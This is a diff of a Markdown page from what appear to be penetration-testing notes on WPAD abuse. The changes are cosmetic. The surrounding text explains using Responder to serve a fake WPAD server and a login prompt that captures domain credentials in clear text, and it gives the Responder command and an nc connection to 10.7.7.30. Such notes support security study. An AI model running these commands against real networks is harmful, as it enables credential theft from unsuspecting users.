@@ -1,4 +1,4 @@
-# WPAD Abuse
+# ⭕ WPAD Abuse
 
 ## WPAD
 
@@ -23,7 +23,7 @@ The important thing is that WPAD protocol is built in Windows operating systems.
 
 #### Responder serves a fake WPAD Server and responds to clients’ WPAD name resolution. The client then requests the wpad.dat file from this fake WPAD Server. Responder creates an authentication screen and asks clients to enter the username and password they use in the domain. Naturally, employees write usernames and passwords used in the domain name. Finally, we can see their username and passwords.
 
-&#x20;we serve the fake HTTP Server and wait for clear-text passwords.
+we serve the fake HTTP Server and wait for clear-text passwords.
 
 ```
 python Responder.py -I eth0 -wFb
@@ -86,9 +86,6 @@ Now, when the victim tries to go out to the internet, ze will only see the follo
 
 ![](<../../../.gitbook/assets/image (258).png>)
 
-
-
 ```
 nc 10.7.7.30 140 -vv
 ```
-
